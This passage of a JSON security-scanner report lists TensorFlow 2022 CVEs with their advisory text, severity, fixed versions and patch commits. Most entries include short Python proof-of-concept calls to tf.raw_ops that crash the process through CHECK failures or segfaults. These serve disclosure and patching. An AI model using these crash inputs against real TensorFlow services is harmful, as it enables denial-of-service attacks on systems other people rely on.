                "markdown": "**Vulnerability CVE-2022-36001**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-36001](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36001)|\n\n### Impact\nWhen `DrawBoundingBoxes` receives an input `boxes` that is not of dtype `float`, it gives a `CHECK` fail that can trigger a denial of service attack.\n```python\nimport tensorflow as tf\nimport numpy as np\narg_0=tf.constant(value=np.random.random(size=(1, 3, 2, 3)), shape=(1, 3, 2, 3), dtype=tf.half)\narg_1=tf.constant(value=np.random.random(size=(1, 2, 4)), shape=(1, 2, 4), dtype=tf.float32)\narg_2=``\ntf.raw_ops.DrawBoundingBoxes(images=arg_0, boxes=arg_1, name=arg_2)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [da0d65cdc1270038e72157ba35bf74b85d9bda11](https://github.com/tensorflow/tensorflow/commit/da0d65cdc1270038e72157ba35bf74b85d9bda11).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35987",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35987"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35987",
              "help": {
                "text": "Vulnerability CVE-2022-35987\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35987](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35987)\n### Impact\n`DenseBincount` assumes its input tensor `weights` to either have the same shape as its input tensor `input` or to be length-0. A different `weights` shape will trigger a `CHECK` fail that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\nbinary_output = True\ninput = tf.random.uniform(shape=[0, 0], minval=-10000, maxval=10000, dtype=tf.int32, seed=-2460)\nsize = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-10000)\nweights = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.float32, seed=-10000)\ntf.raw_ops.DenseBincount(input=input, size=size, weights=weights, binary_output=binary_output)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [bf4c14353c2328636a18bfad1e151052c81d5f43](https://github.com/tensorflow/tensorflow/commit/bf4c14353c2328636a18bfad1e151052c81d5f43).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University\n",
                "markdown": "**Vulnerability CVE-2022-35987**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35987](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35987)|\n\n### Impact\n`DenseBincount` assumes its input tensor `weights` to either have the same shape as its input tensor `input` or to be length-0. A different `weights` shape will trigger a `CHECK` fail that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\nbinary_output = True\ninput = tf.random.uniform(shape=[0, 0], minval=-10000, maxval=10000, dtype=tf.int32, seed=-2460)\nsize = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-10000)\nweights = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.float32, seed=-10000)\ntf.raw_ops.DenseBincount(input=input, size=size, weights=weights, binary_output=binary_output)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [bf4c14353c2328636a18bfad1e151052c81d5f43](https://github.com/tensorflow/tensorflow/commit/bf4c14353c2328636a18bfad1e151052c81d5f43).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35934",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35934"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35934",
              "help": {
                "text": "Vulnerability CVE-2022-35934\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35934)\n### Impact\nThe implementation of tf.reshape op in TensorFlow is vulnerable to a denial of service via CHECK-failure (assertion failure) caused by overflowing the number of elements in a tensor:\n```python\nimport tensorflow as tf\n\ntf.reshape(tensor=[[1]],shape=tf.constant([0 for i in range(255)], dtype=tf.int64))\n```\nThis is another instance of [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md) (https://github.com/advisories/GHSA-prcg-wp5q-rv7p).\n\n### Patches\nWe have patched the issue in GitHub commit [61f0f9b94df8c0411f0ad0ecc2fec2d3f3c33555](https://github.com/tensorflow/tensorflow/commit/61f0f9b94df8c0411f0ad0ecc2fec2d3f3c33555).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Kang Hong Jin from Singapore Management University.\n",
                "markdown": "**Vulnerability CVE-2022-35934**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35934)|\n\n### Impact\nThe implementation of tf.reshape op in TensorFlow is vulnerable to a denial of service via CHECK-failure (assertion failure) caused by overflowing the number of elements in a tensor:\n```python\nimport tensorflow as tf\n\ntf.reshape(tensor=[[1]],shape=tf.constant([0 for i in range(255)], dtype=tf.int64))\n```\nThis is another instance of [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md) (https://github.com/advisories/GHSA-prcg-wp5q-rv7p).\n\n### Patches\nWe have patched the issue in GitHub commit [61f0f9b94df8c0411f0ad0ecc2fec2d3f3c33555](https://github.com/tensorflow/tensorflow/commit/61f0f9b94df8c0411f0ad0ecc2fec2d3f3c33555).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Kang Hong Jin from Singapore Management University.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35972",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35972"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35972",
              "help": {
                "text": "Vulnerability CVE-2022-35972\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35972](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35972)\n### Impact\nIf `QuantizedBiasAdd` is given `min_input`, `max_input`, `min_bias`, `max_bias` tensors of a nonzero rank, it results in a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nout_type = tf.qint32\ninput = tf.constant([85,170,255], shape=[3], dtype=tf.quint8)\nbias = tf.constant(43, shape=[2,3], dtype=tf.quint8)\nmin_input = tf.constant([], shape=[0], dtype=tf.float32)\nmax_input = tf.constant(0, shape=[1], dtype=tf.float32)\nmin_bias = tf.constant(0, shape=[1], dtype=tf.float32)\nmax_bias = tf.constant(0, shape=[1], dtype=tf.float32)\ntf.raw_ops.QuantizedBiasAdd(input=input, bias=bias, min_input=min_input, max_input=max_input, min_bias=min_bias, max_bias=max_bias, out_type=out_type)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [785d67a78a1d533759fcd2f5e8d6ef778de849e0](https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.\n",
                "markdown": "**Vulnerability CVE-2022-35972**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35972](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35972)|\n\n### Impact\nIf `QuantizedBiasAdd` is given `min_input`, `max_input`, `min_bias`, `max_bias` tensors of a nonzero rank, it results in a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nout_type = tf.qint32\ninput = tf.constant([85,170,255], shape=[3], dtype=tf.quint8)\nbias = tf.constant(43, shape=[2,3], dtype=tf.quint8)\nmin_input = tf.constant([], shape=[0], dtype=tf.float32)\nmax_input = tf.constant(0, shape=[1], dtype=tf.float32)\nmin_bias = tf.constant(0, shape=[1], dtype=tf.float32)\nmax_bias = tf.constant(0, shape=[1], dtype=tf.float32)\ntf.raw_ops.QuantizedBiasAdd(input=input, bias=bias, min_input=min_input, max_input=max_input, min_bias=min_bias, max_bias=max_bias, out_type=out_type)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [785d67a78a1d533759fcd2f5e8d6ef778de849e0](https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-36015",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-36015"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36015",
              "help": {
                "text": "Vulnerability CVE-2022-36015\nSeverity: low\nFixed Version: 2.9.1\nLink: [CVE-2022-36015](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36015)\n### Impact\nWhen [`RangeSize`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ops/math_ops.cc) receives values that do not fit into an `int64_t`, it crashes.\n```cpp\n  auto size = (std::is_integral\u003cT\u003e::value\n                   ? ((Eigen::numext::abs(limit - start) +\n                       Eigen::numext::abs(delta) - T(1)) /\n                      Eigen::numext::abs(delta))\n                   : (Eigen::numext::ceil(\n                         Eigen::numext::abs((limit - start) / delta))));\n\n  // This check does not cover all cases.\n  if (size \u003e std::numeric_limits\u003cint64_t\u003e::max()) {\n    return errors::InvalidArgument(\"Requires ((limit - start) / delta) \u003c= \",\n                                   std::numeric_limits\u003cint64_t\u003e::max());\n  }\n\n  c-\u003eset_output(0, c-\u003eVector(static_cast\u003cint64_t\u003e(size)));\n  return Status::OK();\n}\n```\n\n### Patches\nWe have patched the issue in GitHub commit [37e64539cd29fcfb814c4451152a60f5d107b0f0](https://github.com/tensorflow/tensorflow/commit/37e64539cd29fcfb814c4451152a60f5d107b0f0).\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n",
                "markdown": "**Vulnerability CVE-2022-36015**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.9.1|[CVE-2022-36015](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36015)|\n\n### Impact\nWhen [`RangeSize`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ops/math_ops.cc) receives values that do not fit into an `int64_t`, it crashes.\n```cpp\n  auto size = (std::is_integral\u003cT\u003e::value\n                   ? ((Eigen::numext::abs(limit - start) +\n                       Eigen::numext::abs(delta) - T(1)) /\n                      Eigen::numext::abs(delta))\n                   : (Eigen::numext::ceil(\n                         Eigen::numext::abs((limit - start) / delta))));\n\n  // This check does not cover all cases.\n  if (size \u003e std::numeric_limits\u003cint64_t\u003e::max()) {\n    return errors::InvalidArgument(\"Requires ((limit - start) / delta) \u003c= \",\n                                   std::numeric_limits\u003cint64_t\u003e::max());\n  }\n\n  c-\u003eset_output(0, c-\u003eVector(static_cast\u003cint64_t\u003e(size)));\n  return Status::OK();\n}\n```\n\n### Patches\nWe have patched the issue in GitHub commit [37e64539cd29fcfb814c4451152a60f5d107b0f0](https://github.com/tensorflow/tensorflow/commit/37e64539cd29fcfb814c4451152a60f5d107b0f0).\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2022-35971",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35971"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35971",
              "help": {
                "text": "Vulnerability CVE-2022-35971\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35971](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35971)\n### Impact\nIf `FakeQuantWithMinMaxVars` is given `min` or `max` tensors of a nonzero rank, it results in a `CHECK` fail that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nnum_bits = 8\nnarrow_range = False\ninputs = tf.constant(0, shape=[2,3], dtype=tf.float32)\nmin = tf.constant(0, shape=[2,3], dtype=tf.float32)\nmax = tf.constant(0, shape=[2,3], dtype=tf.float32)\ntf.raw_ops.FakeQuantWithMinMaxVars(inputs=inputs, min=min, max=max, num_bits=num_bits, narrow_range=narrow_range)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [785d67a78a1d533759fcd2f5e8d6ef778de849e0](https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by:\n - Neophytos Christou, Secure Systems Labs, Brown University.\n - 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology\n",
                "markdown": "**Vulnerability CVE-2022-35971**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35971](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35971)|\n\n### Impact\nIf `FakeQuantWithMinMaxVars` is given `min` or `max` tensors of a nonzero rank, it results in a `CHECK` fail that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nnum_bits = 8\nnarrow_range = False\ninputs = tf.constant(0, shape=[2,3], dtype=tf.float32)\nmin = tf.constant(0, shape=[2,3], dtype=tf.float32)\nmax = tf.constant(0, shape=[2,3], dtype=tf.float32)\ntf.raw_ops.FakeQuantWithMinMaxVars(inputs=inputs, min=min, max=max, num_bits=num_bits, narrow_range=narrow_range)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [785d67a78a1d533759fcd2f5e8d6ef778de849e0](https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by:\n - Neophytos Christou, Secure Systems Labs, Brown University.\n - 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35985",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35985"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35985",
              "help": {
                "text": "Vulnerability CVE-2022-35985\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35985](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35985)\n### Impact\nIf `LRNGrad` is given an `output_image` input tensor that is not 4-D, it results in a `CHECK` fail that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\ndepth_radius = 1\nbias = 1.59018219\nalpha = 0.117728651\nbeta = 0.404427052\ninput_grads = tf.random.uniform(shape=[4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)\ninput_image = tf.random.uniform(shape=[4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)\noutput_image = tf.random.uniform(shape=[4, 4, 4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)\ntf.raw_ops.LRNGrad(input_grads=input_grads, input_image=input_image, output_image=output_image, depth_radius=depth_radius, bias=bias, alpha=alpha, beta=beta)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [bd90b3efab4ec958b228cd7cfe9125be1c0cf255](https://github.com/tensorflow/tensorflow/commit/bd90b3efab4ec958b228cd7cfe9125be1c0cf255).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University\n",
                "markdown": "**Vulnerability CVE-2022-35985**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35985](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35985)|\n\n### Impact\nIf `LRNGrad` is given an `output_image` input tensor that is not 4-D, it results in a `CHECK` fail that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\ndepth_radius = 1\nbias = 1.59018219\nalpha = 0.117728651\nbeta = 0.404427052\ninput_grads = tf.random.uniform(shape=[4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)\ninput_image = tf.random.uniform(shape=[4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)\noutput_image = tf.random.uniform(shape=[4, 4, 4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)\ntf.raw_ops.LRNGrad(input_grads=input_grads, input_image=input_image, output_image=output_image, depth_radius=depth_radius, bias=bias, alpha=alpha, beta=beta)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [bd90b3efab4ec958b228cd7cfe9125be1c0cf255](https://github.com/tensorflow/tensorflow/commit/bd90b3efab4ec958b228cd7cfe9125be1c0cf255).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35952",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35952"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35952",
              "help": {
                "text": "Vulnerability CVE-2022-35952\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35952](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35952)\n### Impact\nThe [`UnbatchGradOp`](https://github.com/tensorflow/tensorflow/blob/769eddaf479c8debead9a59a72617d6ed6f0fe10/tensorflow/core/kernels/batch_kernels.cc#L891) function takes an argument `id` that is assumed to be a scalar. A nonscalar `id` can trigger a `CHECK` failure and crash the program.\n```python\nimport numpy as np\nimport tensorflow as tf\n\n# `id` is not scalar\ntf.raw_ops.UnbatchGrad(original_input= tf.constant([1]),batch_index=tf.constant([[0,0,0 ], ], dtype=tf.int64),grad=tf.constant([1,]),id=tf.constant([1,1,], dtype=tf.int64))\n```\nIt also requires its argument `batch_index` to contain three times the number of elements as indicated in its `batch_index.dim_size(0)`. An incorrect `batch_index` can trigger a `CHECK` failure and crash the program.\n```python\nimport numpy as np\nimport tensorflow as tf\n\n# batch_index`s size is not 3\ntf.raw_ops.UnbatchGrad(original_input= tf.constant([1]),batch_index=tf.constant([[0,0], ], dtype=tf.int64),grad=tf.constant([1,]),id=tf.constant([1,], dtype=tf.int64))\n```\n\n### Patches\nWe have patched the issue in GitHub commit [5f945fc6409a3c1e90d6970c9292f805f6e6ddf2](https://github.com/tensorflow/tensorflow/commit/5f945fc6409a3c1e90d6970c9292f805f6e6ddf2).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Kang Hong Jin from Singapore Management University and 刘力源 from the Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology\n",
                "markdown": "**Vulnerability CVE-2022-35952**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35952](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35952)|\n\n### Impact\nThe [`UnbatchGradOp`](https://github.com/tensorflow/tensorflow/blob/769eddaf479c8debead9a59a72617d6ed6f0fe10/tensorflow/core/kernels/batch_kernels.cc#L891) function takes an argument `id` that is assumed to be a scalar. A nonscalar `id` can trigger a `CHECK` failure and crash the program.\n```python\nimport numpy as np\nimport tensorflow as tf\n\n# `id` is not scalar\ntf.raw_ops.UnbatchGrad(original_input= tf.constant([1]),batch_index=tf.constant([[0,0,0 ], ], dtype=tf.int64),grad=tf.constant([1,]),id=tf.constant([1,1,], dtype=tf.int64))\n```\nIt also requires its argument `batch_index` to contain three times the number of elements as indicated in its `batch_index.dim_size(0)`. An incorrect `batch_index` can trigger a `CHECK` failure and crash the program.\n```python\nimport numpy as np\nimport tensorflow as tf\n\n# batch_index`s size is not 3\ntf.raw_ops.UnbatchGrad(original_input= tf.constant([1]),batch_index=tf.constant([[0,0], ], dtype=tf.int64),grad=tf.constant([1,]),id=tf.constant([1,], dtype=tf.int64))\n```\n\n### Patches\nWe have patched the issue in GitHub commit [5f945fc6409a3c1e90d6970c9292f805f6e6ddf2](https://github.com/tensorflow/tensorflow/commit/5f945fc6409a3c1e90d6970c9292f805f6e6ddf2).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Kang Hong Jin from Singapore Management University and 刘力源 from the Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35966",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35966"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35966",
              "help": {
                "text": "Vulnerability CVE-2022-35966\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35966](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35966)\n### Impact\nIf `QuantizedAvgPool` is given `min_input` or `max_input` tensors of a nonzero rank, it results in a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nksize = [1, 2, 2, 1]\nstrides = [1, 2, 2, 1]\npadding = \"SAME\"\ninput = tf.constant(1, shape=[1,4,4,2], dtype=tf.quint8)\nmin_input = tf.constant([], shape=[0], dtype=tf.float32)\nmax_input = tf.constant(0, shape=[1], dtype=tf.float32)\ntf.raw_ops.QuantizedAvgPool(input=input, min_input=min_input, max_input=max_input, ksize=ksize, strides=strides, padding=padding)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [7cdf9d4d2083b739ec81cfdace546b0c99f50622](https://github.com/tensorflow/tensorflow/commit/7cdf9d4d2083b739ec81cfdace546b0c99f50622).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.",
                "markdown": "**Vulnerability CVE-2022-35966**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35966](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35966)|\n\n### Impact\nIf `QuantizedAvgPool` is given `min_input` or `max_input` tensors of a nonzero rank, it results in a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nksize = [1, 2, 2, 1]\nstrides = [1, 2, 2, 1]\npadding = \"SAME\"\ninput = tf.constant(1, shape=[1,4,4,2], dtype=tf.quint8)\nmin_input = tf.constant([], shape=[0], dtype=tf.float32)\nmax_input = tf.constant(0, shape=[1], dtype=tf.float32)\ntf.raw_ops.QuantizedAvgPool(input=input, min_input=min_input, max_input=max_input, ksize=ksize, strides=strides, padding=padding)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [7cdf9d4d2083b739ec81cfdace546b0c99f50622](https://github.com/tensorflow/tensorflow/commit/7cdf9d4d2083b739ec81cfdace546b0c99f50622).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University."
              },
              "properties": {
